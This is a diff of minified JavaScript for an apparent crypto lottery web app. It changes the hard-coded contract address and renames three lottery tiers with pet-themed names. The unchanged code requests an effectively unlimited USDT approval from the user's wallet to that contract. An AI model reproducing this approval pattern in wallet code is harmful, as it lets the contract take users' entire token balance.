@@ -409,7 +409,7 @@
                 }];
 
             function O(e) {
-                return new e.eth.Contract(m, "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0")
+                return new e.eth.Contract(m, "0xF936ae36b666cbB844A92292dc8Fc972E481d7e2")
             }
             var x = [{
                 inputs: [],
@@ -992,7 +992,7 @@
                                                 e.next = 10;
                                                 break
                                             }
-                                            return "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", e.next = 4, o.methods.allowance(z, "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0").call();
+                                            return "0xF936ae36b666cbB844A92292dc8Fc972E481d7e2", e.next = 4, o.methods.allowance(z, "0xF936ae36b666cbB844A92292dc8Fc972E481d7e2").call();
                                         case 4:
                                             return t = e.sent, Ge(t), e.next = 8, o.methods.balanceOf(z).call();
                                         case 8:
@@ -1018,7 +1018,7 @@
                                                 e.next = 10;
                                                 break
                                             }
-                                            return $e("Approving USDT"), "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999").send({
+                                            return $e("Approving USDT"), "0xF936ae36b666cbB844A92292dc8Fc972E481d7e2", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xF936ae36b666cbB844A92292dc8Fc972E481d7e2", "99999999999999999999999999999999999999999999999999").send({
                                                 from: z
                                             });
                                         case 7:
@@ -1046,7 +1046,7 @@
                                                 e.next = 9;
                                                 break
                                             }
-                                            return $e("Joining Silver Lottery"), a = y.utils.toWei("5"), e.next = 6, n.methods.joinLottery(a).send({
+                                            return $e("Joining Paw Play"), a = y.utils.toWei("5"), e.next = 6, n.methods.joinLottery(a).send({
                                                 from: z
                                             });
                                         case 6:
@@ -1074,7 +1074,7 @@
                                                 e.next = 9;
                                                 break
                                             }
-                                            return $e("Joining Gold Lottery"), a = y.utils.toWei("10"), e.next = 6, n.methods.joinLottery1(a).send({
+                                            return $e("Joining Golden Treat"), a = y.utils.toWei("10"), e.next = 6, n.methods.joinLottery1(a).send({
                                                 from: z
                                             });
                                         case 6:
@@ -1102,7 +1102,7 @@
                                                 e.next = 9;
                                                 break
                                             }
-                                            return $e("Joining Diamond Lottery"), a = y.utils.toWei("50"), e.next = 6, n.methods.joinLottery2(a).send({
+                                            return $e("Joining Luna Jackpot"), a = y.utils.toWei("50"), e.next = 6, n.methods.joinLottery2(a).send({
                                                 from: z
                                             });
                                         case 6:
@@ -1291,7 +1291,7 @@
                                         className: "card",
                                         children: [Object(g.jsx)("div", {
                                             className: "card-header",
-                                            children: "Silver Lottery"
+                                            children: "Paw Play"
                                         }), Object(g.jsxs)("div", {
                                             className: "card-body",
                                             children: [Object(g.jsx)("table", {
@@ -1367,7 +1367,7 @@
                                         className: "card",
                                         children: [Object(g.jsx)("div", {
                                             className: "card-header",
-                                            children: "Gold Lottery"
+                                            children: "Golden Treat"
                                         }), Object(g.jsxs)("div", {
                                             className: "card-body",
                                             children: [Object(g.jsx)("table", {
@@ -1443,7 +1443,7 @@
                                         className: "card",
                                         children: [Object(g.jsx)("div", {
                                             className: "card-header",
-                                            children: "Diamond Lottery"
+                                            children: "Luna Jackpot"
                                         }), Object(g.jsxs)("div", {
                                             className: "card-body",
                                             children: [Object(g.jsx)("table", {
